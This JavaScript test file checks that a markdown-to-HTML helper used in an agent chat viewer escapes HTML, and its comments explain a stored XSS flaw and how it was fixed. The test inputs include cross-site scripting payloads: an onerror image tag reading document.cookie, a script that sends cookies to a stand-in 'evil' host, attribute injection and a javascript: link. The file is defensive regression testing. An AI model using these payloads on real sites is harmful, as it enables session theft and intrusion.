import test from 'node:test'
import assert from 'node:assert/strict'
import { boldify } from './boldify.js'

// boldify's output goes straight into dangerouslySetInnerHTML in AgentView, so every
// character it returns is parsed as HTML. It applied its markdown substitutions to the
// raw string and escaped nothing, which made agent output — and therefore any database
// value the agent echoes — executable in the reader's browser.
//
// Confirmed by executing the shipped function, not by reading it:
//   boldify('<img src=x onerror=alert(document.cookie)>')
//   -> '<img src=x onerror=alert(document.cookie)>'   (byte-for-byte)
//
// The payload is stored, not reflected: agent_conversation.transcript is replayed into
// this renderer on load, so it fires again on every visit.

test('escapes an image-with-onerror payload instead of returning it verbatim', () => {
  const out = boldify('<img src=x onerror=alert(document.cookie)>')

  assert.ok(!out.includes('<img'), `raw <img reached innerHTML: ${out}`)
  assert.ok(out.includes('&lt;img'), `payload was not escaped: ${out}`)
})

// <script> inserted via innerHTML does not execute, per the HTML spec — the live vector
// is an event-handler attribute. Both are escaped; this case is kept so the distinction
// stays on the record rather than being rediscovered.
test('escapes a script tag', () => {
  const out = boldify('<script>fetch("//evil/"+document.cookie)</script>')

  assert.ok(!out.includes('<script>'), `raw <script> reached innerHTML: ${out}`)
  assert.ok(out.includes('&lt;script&gt;'), out)
})

// The delimiters are consumed by the substitution, so the attacker's quote has to survive
// as data. Unescaped, `**a" onmouseover="alert(1)**` closed <strong>'s attribute list.
test('escapes quotes so a bold span cannot grow an attribute', () => {
  const out = boldify('**a" onmouseover="alert(1)**')

  assert.ok(!out.includes('onmouseover="alert(1)"'), `attribute injection survived: ${out}`)
  assert.ok(out.includes('&quot;'), out)
})

test('escapes a javascript: href smuggled through an anchor', () => {
  const out = boldify('<a href="javascript:alert(1)">x</a>')

  assert.ok(!out.includes('<a href'), out)
})

// Escaping has to happen BEFORE the markdown substitutions, or the <strong> and <code>
// tags boldify emits are themselves escaped and the reader sees literal tag text. That
// ordering is the whole subtlety of this fix and is the obvious thing to "simplify"
// later, so it is pinned here.
test('still renders bold markdown as real strong tags', () => {
  assert.equal(boldify('a **b** c'), 'a <strong>b</strong> c')
})

test('still renders inline code as real code tags', () => {
  assert.equal(boldify('run `SELECT 1` now'), 'run <code>SELECT 1</code> now')
})

// Taken from a real stored transcript (agent_conversation.transcript). The agent leans on
// bold and inline code heavily, and the `t` here is a table name echoed from the database —
// the same channel an injected identifier would arrive on. A fix that broke this formatting
// would be rejected by its users, which is why escaping everything was not an option.
test('renders a real agent reply with its formatting intact', () => {
  const out = boldify('No — **DANGER**. It rewrites the whole `t` table, taking an **AccessExclusiveLock**.')

  assert.equal(
    out,
    'No — <strong>DANGER</strong>. It rewrites the whole <code>t</code> table, '
      + 'taking an <strong>AccessExclusiveLock</strong>.'
  )
})

// A table named by an attacker still has to read as its own name, not as markup.
test('escapes html inside a bold span rather than emitting it', () => {
  const out = boldify('**<img src=x onerror=alert(1)>**')

  assert.ok(out.startsWith('<strong>'), out)
  assert.ok(!out.includes('<img'), out)
  assert.ok(out.includes('&lt;img'), out)
})

test('escapes ampersands so an entity cannot be reconstructed', () => {
  assert.equal(boldify('a & b'), 'a &amp; b')
  assert.ok(!boldify('&lt;img&gt;').includes('&lt;img&gt;'.replace('&lt;', '<')))
})

test('leaves ordinary prose untouched', () => {
  assert.equal(boldify('just a normal sentence'), 'just a normal sentence')
})

test('handles empty and whitespace input', () => {
  assert.equal(boldify(''), '')
  assert.equal(boldify('   '), '   ')
})

// Brain's AgentArtifacts passes its own <code> markup. Presentation differs; the escaping
// must not, or fixing one renderer would leave the other injectable.
test('escapes the same way when a caller supplies its own code tag', () => {
  const styled = '<code style="background:#f3f4f6">$1</code>'

  assert.equal(
    boldify('run `SELECT 1`', styled),
    'run <code style="background:#f3f4f6">SELECT 1</code>'
  )
  const out = boldify('<img src=x onerror=alert(1)>', styled)
  assert.ok(!out.includes('<img'), out)
  assert.ok(out.includes('&lt;img'), out)
})
